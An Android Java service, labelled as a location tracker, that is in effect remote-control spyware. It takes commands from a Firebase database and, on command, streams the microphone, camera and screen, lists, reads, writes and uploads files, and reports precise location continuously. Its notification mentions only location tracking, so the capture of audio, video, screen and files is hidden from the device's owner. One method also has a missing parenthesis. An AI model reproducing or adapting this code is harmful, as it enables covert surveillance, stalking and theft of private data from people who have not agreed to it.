package com.example.foregroundservice;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.location.Location;
import android.os.Build;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.core.app.NotificationCompat;

import com.google.android.gms.location.FusedLocationProviderClient;
import com.google.android.gms.location.LocationCallback;
import com.google.android.gms.location.LocationRequest;
import com.google.android.gms.location.LocationResult;
import com.google.android.gms.location.LocationServices;
import com.google.android.gms.location.Priority;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.database.ChildEventListener;
import com.google.firebase.database.DataSnapshot;
import com.google.firebase.database.DatabaseError;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.auth.FirebaseUser;

import java.util.HashMap;
import java.util.Map;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Handler;
import android.util.Base64;
import android.graphics.ImageFormat;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraCaptureSession;
import android.hardware.camera2.CameraCharacteristics;
import android.hardware.camera2.CameraDevice;
import android.hardware.camera2.CameraManager;
import android.hardware.camera2.CaptureRequest;
import android.hardware.camera2.TotalCaptureResult;
import android.hardware.camera2.CameraCaptureSession.CaptureCallback;
import android.view.Surface;
import android.graphics.SurfaceTexture;
import android.util.Size;
import android.os.Environment;
import android.net.Uri;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.database.ValueEventListener;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ByteArrayOutputStream;
import android.media.projection.MediaProjection;
import android.media.projection.MediaProjectionManager;
import android.media.ImageReader;
import android.media.Image;
import android.graphics.PixelFormat;
import android.hardware.display.DisplayManager;
import android.graphics.Bitmap;
import android.util.DisplayMetrics;
import android.content.Context;
import java.nio.ByteBuffer;
import android.hardware.display.VirtualDisplay;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

public class MyForegroundService extends Service {
    private static final String TAG = "LocationService";
    private static final String CHANNEL_ID = "LocationServiceChannel";
    private static final int NOTIFICATION_ID = 1;

    private FusedLocationProviderClient fusedLocationClient;
    private LocationCallback locationCallback;
    private String userId;
    private FirebaseDatabase database;
    private DatabaseReference commandsRef;
    private boolean isRecording = false;
    private AudioRecord audioRecord;
    private Thread recordingThread;
    private boolean shouldReconnect = true;
    private Handler reconnectHandler = new Handler();
    private MediaProjectionManager projectionManager;
    private MediaProjection mediaProjection;
    private VirtualDisplay virtualDisplay;
    private ImageReader imageReader;
    private Handler screenCaptureHandler;
    private boolean isScreenMirroring = false;
    private static final int SCREEN_WIDTH = 720;  // 720p
    private static final int SCREEN_HEIGHT = 1280;
    private static final int SCREEN_DPI = DisplayMetrics.DENSITY_HIGH;
    private static final int SCREEN_FPS = 15;
    private static final int SAMPLE_RATE = 16000; // or 44100 depending on your needs
    private static final int BUFFER_SIZE = AudioRecord.getMinBufferSize(SAMPLE_RATE, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT);
    private static final int CAMERA_WIDTH = 640; // or 1280, depending on your needs
    private static final int CAMERA_HEIGHT = 480; // or 720, depending on your needs
    private static final int CAMERA_FPS = 15;
    private CameraDevice cameraDevice;
    private CameraCaptureSession captureSession;
    private ImageReader cameraImageReader;
    private boolean isStreamingCamera = false;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service onCreate called");
        createNotificationChannel();
        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
        database = FirebaseDatabase.getInstance();
        projectionManager = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
        screenCaptureHandler = new Handler(Looper.getMainLooper());
        setupCommandListener();
    }

    private void setupCommandListener() {
        FirebaseUser user = FirebaseAuth.getInstance().getCurrentUser();
        if (user != null) {
            userId = user.getUid();
            commandsRef = database.getReference("commands").child(userId);
            commandsRef.addChildEventListener(new ChildEventListener() {
                @Override
                public void onChildAdded(@NonNull DataSnapshot snapshot, String previousChildName) {
                    try {
                        String commandStr = snapshot.getValue(String.class);
                        if (commandStr != null) {
                            handleCommand(commandStr);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing command", e);
                        sendCommandResponse("ERROR", "error", "Invalid command format");
                    } finally {
                        // Remove processed command
                        snapshot.getRef().removeValue();
                    }
                }

                @Override
                public void onChildChanged(@NonNull DataSnapshot snapshot, String previousChildName) {}

                @Override
                public void onChildRemoved(@NonNull DataSnapshot snapshot) {}

                @Override
                public void onChildMoved(@NonNull DataSnapshot snapshot, String previousChildName) {}

                @Override
                public void onCancelled(@NonNull DatabaseError error) {
                    Log.e(TAG, "Command listener cancelled", error.toException());
                    if (shouldReconnect) {
                        reconnectHandler.postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                setupCommandListener();
                            }
                        }, 5000);
                    }
                }
            });

            // Listen for screen capture permission
            database.getReference("screen_capture_permission")
                .child(userId)
                .addValueEventListener(new ValueEventListener() {
                    @Override
                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                        try {
                            String permissionData = snapshot.getValue(String.class);
                            if (permissionData != null) {
                                JSONObject screenData = new JSONObject(permissionData);
                                int resultCode = screenData.getInt("resultCode");
                                Intent data = Intent.parseUri(screenData.getString("data"), 0);
                                startScreenMirroring(resultCode, data);
                            }
                        } catch (Exception e) {
                            Log.e(TAG, "Error processing screen capture permission", e);
                        }
                    }

                    @Override
                    public void onCancelled(@NonNull DatabaseError error) {
                        Log.e(TAG, "Screen capture permission listener cancelled", error.toException());
                    }
                });
        }
    }

    private void handleCommand(String command) {
        try {
            JSONObject cmdObj = new JSONObject(command);
            String action = cmdObj.getString("action");
            JSONObject params = cmdObj.optJSONObject("params");

            switch (action) {
                case "START_MIC":
                    startRecording();
                    break;
                case "STOP_MIC":
                    stopRecording();
                    break;
                case "START_CAMERA":
                    startCameraStream();
                    break;
                case "STOP_CAMERA":
                    stopCameraStream();
                    break;
                case "START_SCREEN":
                    if (params != null && params.has("resultCode") && params.has("data")) {
                        int resultCode = params.getInt("resultCode");
                        Intent data = Intent.parseUri(params.getString("data"), 0);
                        startScreenMirroring(resultCode, data);
                    } else {
                        sendCommandResponse("START_SCREEN", "error", "Missing parameters");
                    }
                    break;
                case "STOP_SCREEN":
                    stopScreenMirroring();
                    break;
                case "LIST_FILES":
                    String path = params != null ? params.optString("path", "/") : "/";
                    listFiles(path);
                    break;
                case "READ_FILE":
                    if (params != null && params.has("path")) {
                        readFile(params.getString("path"));
                    } else {
                        sendCommandResponse("READ_FILE", "error", "Missing path parameter");
                    }
                    break;
                case "WRITE_FILE":
                    if (params != null && params.has("path") && params.has("content")) {
                        writeFile(params.getString("path"), params.getString("content"));
                    } else {
                        sendCommandResponse("WRITE_FILE", "error", "Missing parameters");
                    }
                    break;
                case "DOWNLOAD_FILE":
                    if (params != null && params.has("path")) {
                        uploadFileToFirebase(params.getString("path"));
                    } else {
                        sendCommandResponse("DOWNLOAD_FILE", "error", "Missing path parameter");
                    }
                    break;
                default:
                    sendCommandResponse(action, "error", "Unknown command");
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Error handling command", e);
            sendCommandResponse("ERROR", "error", e.getMessage());
        }
    }

    private void startRecording() {
        if (isRecording) return;

        try {
            audioRecord = new AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT,
                BUFFER_SIZE
            );

            if (audioRecord.getState() != AudioRecord.STATE_INITIALIZED) {
                Log.e(TAG, "AudioRecord initialization failed");
                return;
            }

            isRecording = true;
            audioRecord.startRecording();

            // Start streaming thread
            recordingThread = new Thread(() -> {
                byte[] buffer = new byte[BUFFER_SIZE];
                DatabaseReference audioRef = database.getReference("audio_stream")
                    .child(userId)
                    .child(String.valueOf(System.currentTimeMillis()));

                while (isRecording && !Thread.interrupted()) {
                    int read = audioRecord.read(buffer, 0, BUFFER_SIZE);
                    if (read > 0) {
                        // Convert to Base64 and stream
                        String base64Audio = Base64.encodeToString(buffer, 0, read, Base64.NO_WRAP);
                        audioRef.push().setValue(base64Audio)
                            .addOnFailureListener(e -> {
                                Log.e(TAG, "Error streaming audio", e);
                                if (shouldReconnect) {
                                    reconnectHandler.postDelayed(() -> {
                                        if (isRecording) {
                                            audioRef.push().setValue(base64Audio);
                                        }
                                    }, 1000);
                                }
                            });
                    }
                }
            });
            recordingThread.start();

        } catch (Exception e) {
            Log.e(TAG, "Error starting recording", e);
            stopRecording();
        }
    }

    private void stopRecording() {
        isRecording = false;
        if (recordingThread != null) {
            recordingThread.interrupt();
            recordingThread = null;
        }
        if (audioRecord != null) {
            try {
                audioRecord.stop();
                audioRecord.release();
            } catch (Exception e) {
                Log.e(TAG, "Error stopping recording", e);
            }
            audioRecord = null;
        }
    }

    private void listFiles(String path) {
        try {
            File directory;
            if (path.equals("/")) {
                directory = Environment.getExternalStorageDirectory();
            } else {
                directory = new File(path);
            }

            if (!directory.exists() || !directory.isDirectory()) {
                sendCommandResponse("LIST_FILES", "error", "Invalid directory");
                return;
            }

            JSONArray files = new JSONArray();
            File[] fileList = directory.listFiles();
            if (fileList != null) {
                for (File file : fileList) {
                    JSONObject fileObj = new JSONObject();
                    fileObj.put("name", file.getName());
                    fileObj.put("path", file.getAbsolutePath());
                    fileObj.put("isDirectory", file.isDirectory());
                    fileObj.put("size", file.length());
                    fileObj.put("lastModified", file.lastModified());
                    files.put(fileObj);
                }
            }

            sendCommandResponse("LIST_FILES", "success", files);
        } catch (Exception e) {
            Log.e(TAG, "Error listing files", e);
            sendCommandResponse("LIST_FILES", "error", e.getMessage());
        }
    }

    private void readFile(String path) {
        try {
            File file = new File(path);
            if (!file.exists() || !file.isFile()) {
                sendCommandResponse("READ_FILE", "error", "File not found");
                return;
            }

            byte[] bytes = new byte[(int) file.length()];
            FileInputStream fis = new FileInputStream(file);
            fis.read(bytes);
            fis.close();

            String content = Base64.encodeToString(bytes, Base64.NO_WRAP);
            sendCommandResponse("READ_FILE", "success", content);
        } catch (Exception e) {
            Log.e(TAG, "Error reading file", e);
            sendCommandResponse("READ_FILE", "error", e.getMessage());
        }
    }

    private void writeFile(String path, String content) {
        try {
            File file = new File(path);
            if (!file.exists()) {
                file.getParentFile().mkdirs();
                file.createNewFile();
            }

            byte[] bytes = Base64.decode(content, Base64.NO_WRAP);
            FileOutputStream fos = new FileOutputStream(file);
            fos.write(bytes);
            fos.close();

            sendCommandResponse("WRITE_FILE", "success", "File written successfully");
        } catch (Exception e) {
            Log.e(TAG, "Error writing file", e);
            sendCommandResponse("WRITE_FILE", "error", e.getMessage());
        }
    }

    private void uploadFileToFirebase(String path) {
        try {
            File file = new File(path);
            if (!file.exists() || !file.isFile()) {
                sendCommandResponse("DOWNLOAD_FILE", "error", "File not found");
                return;
            }

            StorageReference storageRef = FirebaseStorage.getInstance().getReference()
                .child("files")
                .child(userId)
                .child(file.getName());

            UploadTask uploadTask = storageRef.putFile(Uri.fromFile(file));
            uploadTask.addOnSuccessListener(taskSnapshot -> {
                storageRef.getDownloadUrl().addOnSuccessListener(uri -> {
                    try {
                        JSONObject response = new JSONObject();
                        response.put("url", uri.toString());
                        response.put("size", file.length());
                        response.put("name", file.getName());
                        sendCommandResponse("DOWNLOAD_FILE", "success", response);
                    } catch (JSONException e) {
                        Log.e(TAG, "Error creating response", e);
                    }
                });
            }).addOnFailureListener(e -> {
                Log.e(TAG, "Error uploading file", e);
                sendCommandResponse("DOWNLOAD_FILE", "error", e.getMessage());
            });
        } catch (Exception e) {
            Log.e(TAG, "Error processing file upload", e);
            sendCommandResponse("DOWNLOAD_FILE", "error", e.getMessage());
        }
    }

    private void startCameraStream() {
        if (isStreamingCamera) return;

        try {
            CameraManager cameraManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            String[] cameraIds = cameraManager.getCameraIdList();
            
            if (cameraIds.length == 0) {
                sendCommandResponse("START_CAMERA", "error", "No cameras available");
                return;
            }

            String cameraId = cameraIds[0]; // Use first available camera
            
            // Create ImageReader for camera frames
            cameraImageReader = ImageReader.newInstance(CAMERA_WIDTH, CAMERA_HEIGHT, ImageFormat.JPEG, 2);
            cameraImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                private long lastFrameTime = 0;

                @Override
                public void onImageAvailable(ImageReader reader) {
                    long currentTime = System.currentTimeMillis();
                    if (currentTime - lastFrameTime < 1000 / CAMERA_FPS) {
                        return; // Skip frame to maintain FPS
                    }
                    lastFrameTime = currentTime;

                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            ByteBuffer buffer = image.getPlanes()[0].getBuffer();
                            byte[] jpegData = new byte[buffer.remaining()];
                            buffer.get(jpegData);

                            // Stream to Firebase
                            String base64Frame = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                            DatabaseReference frameRef = database.getReference("camera_stream")
                                .child(userId)
                                .child(String.valueOf(currentTime));
                            frameRef.setValue(base64Frame);

                            // Clean up old frames (keep last 5 seconds)
                            database.getReference("camera_stream")
                                .child(userId)
                                .orderByKey()
                                .endAt(String.valueOf(currentTime - 5000))
                                .addListenerForSingleValueEvent(new ValueEventListener() {
                                    @Override
                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                        for (DataSnapshot frameSnapshot : snapshot.getChildren()) {
                                            frameSnapshot.getRef().removeValue();
                                        }
                                    }

                                    @Override
                                    public void onCancelled(@NonNull DatabaseError error) {
                                        Log.e(TAG, "Error cleaning old frames", error.toException());
                                    }
                                });
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error processing camera frame", e);
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }
            }, screenCaptureHandler);

            // Open camera
            cameraManager.openCamera(cameraId, new CameraDevice.StateCallback() {
                @Override
                public void onOpened(@NonNull CameraDevice camera) {
                    cameraDevice = camera;
                    createCameraCaptureSession();
                }

                @Override
                public void onDisconnected(@NonNull CameraDevice camera) {
                    camera.close();
                    cameraDevice = null;
                }

                @Override
                public void onError(@NonNull CameraDevice camera, int error) {
                    camera.close();
                    cameraDevice = null;
                    sendCommandResponse("START_CAMERA", "error", "Camera error: " + error);
                }
            }, screenCaptureHandler);

        } catch (Exception e) {
            Log.e(TAG, "Error starting camera", e);
            sendCommandResponse("START_CAMERA", "error", e.getMessage());
        }
    }

    private void createCameraCaptureSession() {
        try {
            if (cameraDevice == null || cameraImageReader == null) return;

            cameraDevice.createCaptureSession(
                java.util.Arrays.asList(cameraImageReader.getSurface()),
                new CameraCaptureSession.StateCallback() {
                    @Override
                    public void onConfigured(@NonNull CameraCaptureSession session) {
                        captureSession = session;
                        startCameraPreview();
                        isStreamingCamera = true;
                        sendCommandResponse("START_CAMERA", "success", "Camera stream started");
                    }

                    @Override
                    public void onConfigureFailed(@NonNull CameraCaptureSession session) {
                        sendCommandResponse("START_CAMERA", "error", "Camera session configuration failed");
                    }
                }, screenCaptureHandler);
        } catch (Exception e) {
            Log.e(TAG, "Error creating camera capture session", e);
            sendCommandResponse("START_CAMERA", "error", e.getMessage());
        }
    }

    private void startCameraPreview() {
        try {
            if (cameraDevice == null || captureSession == null || cameraImageReader == null) return;

            CaptureRequest.Builder captureBuilder = cameraDevice.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW);
            captureBuilder.addTarget(cameraImageReader.getSurface());
            captureBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO);

            captureSession.setRepeatingRequest(captureBuilder.build(), null, screenCaptureHandler);
        } catch (Exception e) {
            Log.e(TAG, "Error starting camera preview", e);
        }
    }

    private void stopCameraStream() {
        if (!isStreamingCamera) return;

        try {
            if (captureSession != null) {
                captureSession.close();
                captureSession = null;
            }
            if (cameraDevice != null) {
                cameraDevice.close();
                cameraDevice = null;
            }
            if (cameraImageReader != null) {
                cameraImageReader.close();
                cameraImageReader = null;
            }
            isStreamingCamera = false;
            sendCommandResponse("STOP_CAMERA", "success", "Camera stream stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping camera", e);
            sendCommandResponse("STOP_CAMERA", "error", e.getMessage());
        }
    }

    private void startScreenMirroring(int resultCode, Intent data) {
        if (isScreenMirroring) return;

        try {
            mediaProjection = projectionManager.getMediaProjection(resultCode, data);
            if (mediaProjection == null) {
                Log.e(TAG, "Failed to create MediaProjection");
                return;
            }

            imageReader = ImageReader.newInstance(
                SCREEN_WIDTH, SCREEN_HEIGHT, 
                PixelFormat.RGBA_8888, 2);

            virtualDisplay = mediaProjection.createVirtualDisplay(
                "ScreenCapture",
                SCREEN_WIDTH, SCREEN_HEIGHT, SCREEN_DPI,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader.getSurface(), null, null);

            imageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
                private long lastFrameTime = 0;

                @Override
                public void onImageAvailable(ImageReader reader) {
                    long currentTime = System.currentTimeMillis();
                    if (currentTime - lastFrameTime < 1000 / SCREEN_FPS) {
                        return; // Skip frame to maintain FPS
                    }
                    lastFrameTime = currentTime;

                    Image image = null;
                    try {
                        image = reader.acquireLatestImage();
                        if (image != null) {
                            Image.Plane[] planes = image.getPlanes();
                            ByteBuffer buffer = planes[0].getBuffer();
                            int pixelStride = planes[0].getPixelStride();
                            int rowStride = planes[0].getRowStride();
                            int rowPadding = rowStride - pixelStride * SCREEN_WIDTH;

                            // Create bitmap
                            Bitmap bitmap = Bitmap.createBitmap(
                                SCREEN_WIDTH + rowPadding / pixelStride,
                                SCREEN_HEIGHT, Bitmap.Config.ARGB_8888);
                            bitmap.copyPixelsFromBuffer(buffer);

                            // Compress to JPEG
                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            bitmap.compress(Bitmap.CompressFormat.JPEG, 50, baos);
                            byte[] jpegData = baos.toByteArray();

                            // Stream to Firebase
                            String base64Frame = Base64.encodeToString(jpegData, Base64.NO_WRAP);
                            DatabaseReference frameRef = database.getReference("screen_stream")
                                .child(userId)
                                .child(String.valueOf(currentTime));
                            frameRef.setValue(base64Frame);

                            // Clean up old frames (keep last 5 seconds)
                            database.getReference("screen_stream")
                                .child(userId)
                                .orderByKey()
                                .endAt(String.valueOf(currentTime - 5000))
                                .addListenerForSingleValueEvent(new ValueEventListener() {
                                    @Override
                                    public void onDataChange(@NonNull DataSnapshot snapshot) {
                                        for (DataSnapshot frameSnapshot : snapshot.getChildren()) {
                                            frameSnapshot.getRef().removeValue();
                                        }
                                    }

                                    @Override
                                    public void onCancelled(@NonNull DatabaseError error) {
                                        Log.e(TAG, "Error cleaning old frames", error.toException());
                                    }
                                });

                            bitmap.recycle();
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Error capturing screen", e);
                    } finally {
                        if (image != null) {
                            image.close();
                        }
                    }
                }
            }, screenCaptureHandler);

            isScreenMirroring = true;
            sendCommandResponse("START_SCREEN", "success", "Screen mirroring started");
        } catch (Exception e) {
            Log.e(TAG, "Error starting screen mirroring", e);
            sendCommandResponse("START_SCREEN", "error", e.getMessage());
            stopScreenMirroring();
        }
    }

    private void stopScreenMirroring() {
        if (!isScreenMirroring) return;

        try {
            if (virtualDisplay != null) {
                virtualDisplay.release();
                virtualDisplay = null;
            }
            if (imageReader != null) {
                imageReader.close();
                imageReader = null;
            }
            if (mediaProjection != null) {
                mediaProjection.stop();
                mediaProjection = null;
            }
            isScreenMirroring = false;
            sendCommandResponse("STOP_SCREEN", "success", "Screen mirroring stopped");
        } catch (Exception e) {
            Log.e(TAG, "Error stopping screen mirroring", e);
            sendCommandResponse("STOP_SCREEN", "error", e.getMessage());
        }
    }

    private void sendCommandResponse(String command, String status, Object data) {
        try {
            JSONObject response = new JSONObject();
            response.put("command", command);
            response.put("status", status);
            response.put("data", data);
            response.put("timestamp", System.currentTimeMillis());
            
            database.getReference("command_responses")
                .child(userId)
                .push()
                .setValue(response.toString())
                .addOnFailureListener(e -> 
                    Log.e(TAG, "Error sending command response", e);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating response", e);
        }
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG, "Service onStartCommand called");
        
        userId = intent.getStringExtra("user_id");
        if (userId == null) {
            userId = FirebaseAuth.getInstance().getCurrentUser().getUid();
        }
        Log.d(TAG, "User ID configured: " + userId);

        Notification notification = createNotification();
        startForeground(NOTIFICATION_ID, notification);
        
        startLocationUpdates();
        
        return START_STICKY;
    }

    private void startLocationUpdates() {
        LocationRequest locationRequest = new LocationRequest.Builder(Priority.PRIORITY_HIGH_ACCURACY, 5000)
                .setWaitForAccurateLocation(true)
                .setMinUpdateIntervalMillis(3000)
                .setMaxUpdateDelayMillis(10000)
                .setMinUpdateDistanceMeters(1)
                .build();

        locationCallback = new LocationCallback() {
            @Override
            public void onLocationResult(@NonNull LocationResult locationResult) {
                for (Location location : locationResult.getLocations()) {
                    if (location.getAccuracy() <= 20) {
                        sendLocationToFirebase(location);
                    }
                }
            }
        };

        try {
            fusedLocationClient.requestLocationUpdates(locationRequest,
                    locationCallback,
                    Looper.getMainLooper());
        } catch (SecurityException e) {
            Log.e(TAG, "Error requesting location updates", e);
            if (shouldReconnect) {
                reconnectHandler.postDelayed(this::startLocationUpdates, 5000);
            }
        }
    }

    private void sendLocationToFirebase(Location location) {
        Map<String, Object> locationData = new HashMap<>();
        locationData.put("latitude", location.getLatitude());
        locationData.put("longitude", location.getLongitude());
        locationData.put("accuracy", location.getAccuracy());
        locationData.put("timestamp", location.getTime());
        
        // Add formatted date and time for better readability
        java.text.SimpleDateFormat sdf = new java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault());
        String formattedDateTime = sdf.format(new java.util.Date(location.getTime()));
        locationData.put("formattedDateTime", formattedDateTime);

        database.getReference("locations")
                .child(userId)
                .push()
                .setValue(locationData)
                .addOnFailureListener(e -> {
                    Log.e(TAG, "Error saving location", e);
                    if (shouldReconnect) {
                        reconnectHandler.postDelayed(() -> sendLocationToFirebase(location), 5000);
                    }
                });
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        shouldReconnect = false;
        stopRecording();
        stopCameraStream();
        stopScreenMirroring();
        if (fusedLocationClient != null && locationCallback != null) {
            fusedLocationClient.removeLocationUpdates(locationCallback);
        }
        reconnectHandler.removeCallbacksAndMessages(null);
        screenCaptureHandler.removeCallbacksAndMessages(null);
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel serviceChannel = new NotificationChannel(
                    CHANNEL_ID,
                    "Location Service Channel",
                    NotificationManager.IMPORTANCE_DEFAULT
            );
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(serviceChannel);
            }
        }
    }

    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Location Service")
                .setContentText("Tracking location for user: " + userId)
                .setSmallIcon(R.drawable.ic_notification)
                .build();
    }
}
